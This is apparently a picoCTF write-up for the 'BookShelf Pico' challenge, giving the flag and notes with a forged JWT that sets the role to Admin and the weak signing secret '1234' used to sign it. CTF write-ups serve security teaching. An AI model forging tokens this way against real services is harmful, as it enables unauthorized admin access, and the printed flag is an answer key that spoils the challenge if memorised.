#### Description

BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/481/bookshelf-pico.zip). Website can be accessed [here!](http://saturn.picoctf.net:55612/).

**Solución** 

picoCTF{w34k_jwt_n0t_g00d_ca4d9701}

**Notas adicionales**

```
Encode JWT:

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NzQ3MzQ1NjcsImlhdCI6MTc3NDEyOTc2NywidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.ycGida8XT92Sm9qSZW31Y4PfjOvUlFkBBo2e5O60vQ8

DATA:

{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1774734567,
  "iat": 1774129767,
  "userId": 2,
  "email": "admin"
}

#### Sign JWT Secret:

1234

```

**Referencias**

